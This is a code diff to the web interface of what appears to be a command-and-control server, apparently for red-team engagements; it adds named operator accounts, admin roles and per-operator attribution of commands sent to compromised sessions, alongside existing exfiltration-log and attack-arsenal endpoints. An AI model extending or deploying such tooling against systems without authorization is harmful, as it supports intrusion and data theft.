@@ -180,17 +180,18 @@ def _label_session(db, session_id: str, body: bytes) -> dict:
 def _api_c2_sessions() -> dict:
     return _srv().get_c2_sessions()
 
-def _api_c2_task(session_id: str, body: bytes) -> tuple:
+def _api_c2_task(session_id: str, body: bytes, operator: str = "unknown") -> tuple:
     try:
         cmd = json.loads(body or b"{}").get("cmd", "").strip()
     except Exception:
         cmd = ""
     if not cmd:
         return _j({"error": "empty command"}, 400)
-    task_id = _srv()._c2_push_task(session_id, cmd)
+    task_id = _srv()._c2_push_task(session_id, cmd, operator)
     if task_id is None:
         return _j({"error": "session not found"}, 404)
-    _srv()._sse_publish({"type": "task_queued", "task_id": task_id, "session_id": session_id, "cmd": cmd})
+    _srv()._sse_publish({"type": "task_queued", "task_id": task_id, "session_id": session_id,
+                         "cmd": cmd, "operator": operator})
     return _j({"task_id": task_id})
 
 def _api_c2_result(session_id: str, task_id: str) -> tuple:
@@ -394,8 +395,52 @@ def _api_admin_status() -> dict:
         "uptime_s":     int(_time.time() - getattr(srv, "_START_TIME", _STARTUP)),
         "live_sessions": len(srv.get_c2_sessions()),
         "callbacks":     len(srv._EXFIL_LOG),
-        "auth_enabled":  bool(srv._UI_TOKENS),
+        "auth_enabled":  bool(srv._OPERATORS or srv._UI_TOKENS),
     }
+
+# ── Operator management ───────────────────────────────────────────────────────
+
+def _api_operators_list() -> dict:
+    srv = _srv()
+    online = {s["username"] for s in srv._UI_SESSIONS.values()
+              if s.get("expiry") and s["expiry"] > __import__("datetime").datetime.now()}
+    ops = []
+    for name, info in srv._OPERATORS.items():
+        ops.append({"username": name, "role": info["role"],
+                    "created_at": info.get("created_at", ""),
+                    "online": name in online})
+    return {"operators": ops}
+
+def _api_operator_create(body: bytes, requestor_role: str) -> dict:
+    if requestor_role != "admin":
+        return {"error": "forbidden"}
+    try:
+        d = json.loads(body or b"{}")
+    except Exception:
+        return {"error": "bad json"}
+    username = str(d.get("username", "")).strip()[:32]
+    password = str(d.get("password", "")).strip()
+    role     = d.get("role", "operator")
+    if role not in ("admin", "operator"):
+        role = "operator"
+    if not username or not password:
+        return {"error": "username and password required"}
+    _srv().add_operator(username, password, role)
+    return {"ok": True, "username": username, "role": role}
+
+def _api_operator_delete(username: str, requestor_role: str, requestor: str) -> dict:
+    if requestor_role != "admin":
+        return {"error": "forbidden"}
+    if username == requestor:
+        return {"error": "cannot delete yourself"}
+    if username not in _srv()._OPERATORS:
+        return {"error": "not found"}
+    del _srv()._OPERATORS[username]
+    # Revoke all sessions for this operator
+    to_rm = [k for k, v in _srv()._UI_SESSIONS.items() if v.get("username") == username]
+    for k in to_rm:
+        del _srv()._UI_SESSIONS[k]
+    return {"ok": True}
 
 def _api_admin_engagement_get() -> dict:
     if not _workspace:
@@ -481,7 +526,7 @@ def _api_astaroth(body: bytes, db) -> tuple:
 
 # ── Router ────────────────────────────────────────────────────────────────────
 
-def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
+def handle_ui_request(method: str, path: str, body: bytes, db, headers=None) -> tuple:
     path = path.split("?")[0]
 
     if method == "GET":
@@ -519,6 +564,12 @@ def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
             return _j(_api_admin_status())
         if path == "/ui/api/admin/engagement":
             return _j(_api_admin_engagement_get())
+        if path == "/ui/api/admin/operators":
+            return _j(_api_operators_list())
+        if path == "/ui/api/admin/whoami":
+            op = _srv()._get_operator(headers) if headers else None
+            return _j({"username": op["username"], "role": op["role"]} if op
+                      else {"username": "guest", "role": "operator"})
 
     if method == "POST":
         if path == "/ui/api/astaroth/consult":
@@ -529,15 +580,27 @@ def handle_ui_request(method: str, path: str, body: bytes, db) -> tuple:
             return _j(_label_session(db, m.group(1), body))
         m = re.fullmatch(r"/ui/api/c2/([^/]+)/task", path)
         if m:
-            return _api_c2_task(m.group(1), body)
+            op = _srv()._get_operator(headers) if headers else None
+            op_name = op["username"] if op else "unknown"
+            return _api_c2_task(m.group(1), body, op_name)
         if path == "/ui/api/arsenal/snapshot":
             return _j(_api_arsenal_snapshot())
         if path == "/ui/api/arsenal/run":
             return _api_arsenal_run(body)
         if path == "/ui/api/admin/engagement":
             return _j(_api_admin_engagement_save(body))
+        if path == "/ui/api/admin/operators":
+            op = _srv()._get_operator(headers) if headers else None
+            role = op["role"] if op else "operator"
+            return _j(_api_operator_create(body, role))
 
     if method == "DELETE":
+        m = re.fullmatch(r"/ui/api/admin/operators/([^/]+)", path)
+        if m:
+            op = _srv()._get_operator(headers) if headers else None
+            role = op["role"] if op else "operator"
+            who  = op["username"] if op else ""
+            return _j(_api_operator_delete(m.group(1), role, who))
         m = re.fullmatch(r"/ui/api/c2/([^/]+)", path)
         if m:
             return _api_c2_kill(m.group(1))
@@ -997,6 +1060,10 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
     </div>
     <span id="ticker">—</span>
     <span id="ts"></span>
+    <span id="op-badge" style="font-size:9px;letter-spacing:.08em;color:var(--dim);
+      padding:2px 6px;border:1px solid var(--border);border-radius:2px;display:none">
+      <span id="op-name">—</span>
+    </span>
   </div>
 </div>
 
@@ -1273,6 +1340,39 @@ input[type=text]:focus { outline:none; border-color:var(--red); }
                    padding:14px;max-height:400px;overflow-y:auto;font-size:11px">
             <div style="color:var(--dim)">Loading…</div>
           </div>
+        </div>
+
+        <!-- Operators panel -->
+        <div style="flex:2;min-width:280px" id="admin-operators-panel">
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:10px">
+            <span style="font-size:9px;letter-spacing:.12em;color:var(--dim)">OPERATORS</span>
+            <button class="btn btn-sm" onclick="loadAdminOperators()">↺</button>
+          </div>
+          <div id="admin-operators-list"
+            style="background:var(--surf2);border:1px solid var(--border);border-radius:3px;
+                   padding:14px;max-height:300px;overflow-y:auto;font-size:11px;margin-bottom:10px">
+            <div style="color:var(--dim)">Loading…</div>
+          </div>
+          <div id="admin-op-create" style="display:none;background:var(--surf2);border:1px solid var(--border);
+               border-radius:3px;padding:12px;display:flex;flex-direction:column;gap:8px">
+            <span style="font-size:9px;letter-spacing:.1em;color:var(--dim)">CREATE OPERATOR</span>
+            <div style="display:grid;grid-template-columns:80px 1fr;gap:6px 10px;align-items:center;font-size:11px">
+              <span style="color:var(--dim)">Username</span>
+              <input type="text" id="new-op-name" placeholder="operator1" autocomplete="off">
+              <span style="color:var(--dim)">Password</span>
+              <input type="password" id="new-op-pass" placeholder="strong password" autocomplete="new-password">
+              <span style="color:var(--dim)">Role</span>
+              <select id="new-op-role" style="background:var(--surf3);border:1px solid var(--bord2);
+                     color:var(--text);font:11px var(--mono);padding:4px 6px;border-radius:2px">
+                <option value="operator">operator</option>
+                <option value="admin">admin</option>
+              </select>
+            </div>
+            <button class="btn btn-sm" onclick="createOperator()" style="align-self:flex-start">Create</button>
+            <div id="new-op-err" style="color:var(--red2);font-size:10px"></div>
+          </div>
+          <button class="btn btn-sm" id="admin-op-create-toggle"
+            onclick="toggleOpCreate()" style="margin-top:8px">+ New Operator</button>
         </div>
 
       </div>
@@ -1748,7 +1848,8 @@ async function shellSend() {
   shellHist.push(cmd);
   if (shellHist.length > 300) shellHist.shift();
 
-  const cmdEl = shellAppendCmd(cmd);
+  const opName = document.getElementById('op-name')?.textContent || '';
+  const cmdEl = shellAppendCmd(cmd, opName);
   const pendEl = shellAppend('pending', '  ▸ dispatching…');
 
   try {
@@ -1795,13 +1896,16 @@ async function shellSend() {
   }
 }
 
-function shellAppendCmd(cmd) {
+function shellAppendCmd(cmd, operator) {
   const out = document.getElementById('shell-out');
   const d   = document.createElement('div');
   d.className = 'sl sl-cmd-line';
   const now = new Date();
   const ts  = now.toTimeString().slice(0,8);
-  d.innerHTML = `<span class="sl-prompt">C2&gt;</span><span class="sl-cmd">${esc(cmd)}</span><span class="sl-ts">${ts}</span>`;
+  const opTag = (operator && operator !== 'unknown')
+    ? `<span style="color:var(--dim);font-size:9px;margin-left:4px">[${esc(operator)}]</span>`
+    : '';
+  d.innerHTML = `<span class="sl-prompt">C2&gt;</span><span class="sl-cmd">${esc(cmd)}</span>${opTag}<span class="sl-ts">${ts}</span>`;
   out.appendChild(d);
   shellScroll();
   return d;
@@ -2355,7 +2459,7 @@ async function astAutoAnalyze() {
 
 // ── Admin ──────────────────────────────────────────────────────────────────
 async function loadAdmin() {
-  await Promise.all([loadAdminStatus(), loadAdminEngagement(), loadAdminVersions()]);
+  await Promise.all([loadAdminStatus(), loadAdminEngagement(), loadAdminVersions(), loadAdminOperators()]);
 }
 
 async function loadAdminStatus() {
@@ -2444,6 +2548,75 @@ async function adminLogout() {
   window.location.href = '/ui/login';
 }
 
+// ── Operator management ────────────────────────────────────────────────────
+async function loadAdminOperators() {
+  const el = document.getElementById('admin-operators-list');
+  if (!el) return;
+  try {
+    const d = await fetch('/ui/api/admin/operators').then(r=>r.json());
+    if (!d.operators || d.operators.length === 0) {
+      el.innerHTML = '<span style="color:var(--dim)">No named operators (legacy token mode)</span>';
+      return;
+    }
+    el.innerHTML = d.operators.map(op => {
+      const dot   = op.online ? '●' : '○';
+      const dotC  = op.online ? 'var(--green)' : 'var(--dim)';
+      const badge = op.role === 'admin'
+        ? '<span style="color:var(--red2);margin-left:4px;font-size:9px">ADMIN</span>'
+        : '<span style="color:var(--dim);margin-left:4px;font-size:9px">OP</span>';
+      const del   = `<button class="btn btn-sm btn-red" style="padding:1px 6px;font-size:9px"
+        onclick="deleteOperator('${esc(op.username)}')">×</button>`;
+      return `<div style="display:flex;align-items:center;gap:8px;padding:4px 0;
+                    border-bottom:1px solid var(--border)">
+        <span style="color:${dotC}">${dot}</span>
+        <span style="flex:1;font-weight:500">${esc(op.username)}</span>
+        ${badge}
+        <span style="color:var(--dim);font-size:9px">${op.created_at.slice(0,10)}</span>
+        ${del}
+      </div>`;
+    }).join('');
+  } catch(_) {
+    el.innerHTML = '<span style="color:var(--dim)">Could not load operators</span>';
+  }
+}
+
+function toggleOpCreate() {
+  const p = document.getElementById('admin-op-create');
+  const b = document.getElementById('admin-op-create-toggle');
+  const shown = p.style.display !== 'none';
+  p.style.display = shown ? 'none' : 'flex';
+  b.textContent   = shown ? '+ New Operator' : '− Cancel';
+}
+
+async function createOperator() {
+  const name = document.getElementById('new-op-name')?.value.trim();
+  const pass = document.getElementById('new-op-pass')?.value.trim();
+  const role = document.getElementById('new-op-role')?.value || 'operator';
+  const err  = document.getElementById('new-op-err');
+  if (!name || !pass) { if(err) err.textContent='Username and password required'; return; }
+  const r = await fetch('/ui/api/admin/operators',{method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({username:name,password:pass,role})});
+  const d = await r.json();
+  if (d.ok) {
+    if(err) err.textContent='';
+    document.getElementById('new-op-name').value='';
+    document.getElementById('new-op-pass').value='';
+    toggleOpCreate();
+    await loadAdminOperators();
+  } else {
+    if(err) err.textContent = d.error || 'Failed';
+  }
+}
+
+async function deleteOperator(username) {
+  if (!confirm('Delete operator ' + username + '?')) return;
+  const r = await fetch('/ui/api/admin/operators/'+encodeURIComponent(username),{method:'DELETE'});
+  const d = await r.json();
+  if (d.ok) await loadAdminOperators();
+  else shellAppend('err', '[-] '+JSON.stringify(d));
+}
+
 // ── bootstrap ──────────────────────────────────────────────────────────────
 async function loadLive() {
   try {
@@ -2463,6 +2636,18 @@ async function loadDB() {
 (async () => {
   await Promise.all([loadLive(), loadDB()]);
   connectSSE();
+  // Populate operator badge
+  try {
+    const me = await fetch('/ui/api/admin/whoami').then(r=>r.json());
+    if (me && me.username && me.username !== 'guest') {
+      const badge = document.getElementById('op-badge');
+      const name  = document.getElementById('op-name');
+      if (badge && name) {
+        name.textContent = me.role === 'admin' ? me.username + ' ★' : me.username;
+        badge.style.display = 'inline-block';
+      }
+    }
+  } catch(_) {}
   // Light fallback poll for live session state (stale detection etc.)
   setInterval(loadLive, 10000);
 })();
